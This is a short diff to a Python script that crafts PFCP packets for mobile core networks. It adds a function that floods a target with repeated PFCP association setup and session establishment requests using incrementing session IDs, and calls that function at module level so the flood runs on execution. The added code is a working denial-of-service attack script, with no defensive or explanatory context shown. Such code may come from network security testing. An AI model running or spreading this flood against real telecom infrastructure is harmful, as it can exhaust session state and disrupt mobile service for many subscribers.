@@ -80,3 +80,20 @@ def send_pfcp_session_establishment_req(seid=0xC0FFEE):
     print("Packet sent.")
     seq += 1
 
+
+
+
+def session_establishment_flood(reqNbr=100, delay=0.1):
+    seid = 1
+    
+    for _ in range(reqNbr):
+        send_pfcp_association_setup_req()
+        
+        send_pfcp_session_establishment_req(seid=seid)
+        seid += 1
+        if seid > 0xFFFFFFFFFFFFFFFF:  # reset SEID if it exceeds the max val
+            seid = 0
+        time.sleep(delay)
+        
+
+session_establishment_flood(reqNbr=100, delay=0.1)
